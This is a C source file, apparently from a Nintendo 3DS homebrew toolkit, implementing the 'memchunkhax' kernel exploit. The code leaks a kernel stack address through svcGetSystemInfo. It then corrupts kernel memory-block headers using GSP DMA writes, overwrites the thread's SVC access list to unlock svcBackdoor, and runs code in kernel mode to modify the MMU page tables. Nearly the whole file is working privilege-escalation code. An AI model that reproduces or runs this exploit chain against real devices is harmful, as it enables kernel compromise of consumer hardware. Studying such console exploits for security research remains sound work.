#include "memchunkhax.h"
#include "lib/gsp.h"

static s32 kMapL2Table(void)
{
    // Disable interrupts asap (svcBackdoor sucks)
    __asm__ __volatile__ ("cpsid aif" ::: "memory");

    static const u32 l1tables[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
    u32 numCores = IS_N3DS ? 4 : 2;

    // Fetch layout from scratch area
    const BlobLayout *layout = *(const BlobLayout **)getThreadCommandBuffer();

    // For each core, create a MMU entry, L1 entry mapping a page table, to map MAP_ADDR
    for (u32 i = 0; i < numCores; i++) {
        vu32 *table = (u32 *)KERNPA2VA(l1tables[i]);
        table[KHC3DS_MAP_ADDR >> 20] = convertLinearMemToPhys(layout->l2table) | 1;
    }

    return 0;
}

static Result doMemchunkhax(u32 val1, u32 val2, void *workBuffer, Handle gspHandle)
{
    /* pseudo-code:
    * if(val2)
    * {
    *    *(u32*)val1 = val2;
    *    *(u32*)(val2 + 8) = (val1 - 4);
    * }
    * else
    *    *(u32*)val1 = 0x0;
    */

    Result res = 0;

    // Adapted from https://github.com/aliaspider/svchax/blob/master/svchax.c#L404
    // See also: https://www.3dbrew.org/wiki/MemoryBlockHeader

    u32 bufVa = (u32)workBuffer;
    u32 bufPa = convertLinearMemToPhys(workBuffer);
    u32 tmp;

    vu32 *nextPtr1 = (vu32 *)(bufVa + 0x0004);
    vu32 *nextPtr3 = (vu32 *)(bufVa + 0x2004);
    vu32 *prevPtr3 = (vu32 *)(bufVa + 0x2008);
    vu32 *prevPtr6 = (vu32 *)(bufVa + 0x5008);

    TRY(svcControlMemory(&tmp, bufVa + 0x1000, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE));
    TRY(svcControlMemory(&tmp, bufVa + 0x3000, 0, 0x2000, MEMOP_FREE, MEMPERM_DONTCARE));
    TRY(svcControlMemory(&tmp, bufVa + 0x6000, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE));

    // Trigger full dcache clean-invalidate using the size trick
    gspDoFullCleanInvCacheTrick(gspHandle);
    gspwn(gspHandle, bufPa + 0x0000, bufPa + 0x1000, 16);
    gspwn(gspHandle, bufPa + 0x2000, bufPa + 0x3000, 16);
    gspwn(gspHandle, bufPa + 0x5000, bufPa + 0x6000, 16);
    gspDoFullCleanInvCacheTrick(gspHandle);

    *nextPtr1 = *nextPtr3;
    *prevPtr6 = *prevPtr3;

    *prevPtr3 = val1 - 4;
    *nextPtr3 = val2;

    gspDoFullCleanInvCacheTrick(gspHandle);
    gspwn(gspHandle, bufPa + 0x3000, bufPa + 0x2000, 16);
    gspDoFullCleanInvCacheTrick(gspHandle);

    TRY(svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE));

    gspDoFullCleanInvCacheTrick(gspHandle);
    gspwn(gspHandle, bufPa + 0x1000, bufPa + 0x0000, 16);
    gspwn(gspHandle, bufPa + 0x6000, bufPa + 0x5000, 16);
    gspDoFullCleanInvCacheTrick(gspHandle);

    TRY(svcControlMemory(&tmp, bufVa + 0x0000, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE));
    TRY(svcControlMemory(&tmp, bufVa + 0x2000, 0, 0x4000, MEMOP_FREE, MEMPERM_DONTCARE));
    TRY(svcControlMemory(&tmp, bufVa + 0x7000, 0, 0x9000, MEMOP_FREE, MEMPERM_DONTCARE));

    // Realloc everything at what should be the same VA
    TRY(svcControlMemory(&tmp, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE));
    res = tmp == (uintptr_t)workBuffer ? 0 : 0xDEAD1337;

    return res;
}

static u32 leakCurThreadKernelStackAddr(void)
{
    // Fixed on 11.0. Has the advantage of working with Luma's kext.
    // Nice meme

    s64 out;
    svcGetSystemInfo(&out, 0xDEAD, 0xCAFE);
    return (u32)(out & ~0xFFF);
}

Result memchunkhax(void *workBuffer, Handle gspHandle)
{
    // Use TLS as scratch area for memchunkhax

    Result res = 0;
    u32 kernStackAddr = leakCurThreadKernelStackAddr();
    u32 *scratch = getThreadCommandBuffer();

    // *scratch contains what we're going to write (enable all 8 SVCs in the range to 1). scratch+8/4 will become corrupted
    // Give us access to svcBackdoor by overwriting the thread's svc ACL copy
    *scratch = 0xFFFFFFFF;
    u32 targetAddr = (kernStackAddr + 0xF38 + 0x7B / 8) & ~3;
    TRY(doMemchunkhax(targetAddr, (u32)scratch, workBuffer, gspHandle));

    return res;
}

void mapL2TableViaSvc0x7b(const BlobLayout *layout)
{
    u32 *scratch = getThreadCommandBuffer();

    // Do the thing:
    *scratch = (u32)layout;
    svcBackdoor(kMapL2Table);

    __dsb();
    __flush_prefetch_buffer();
}
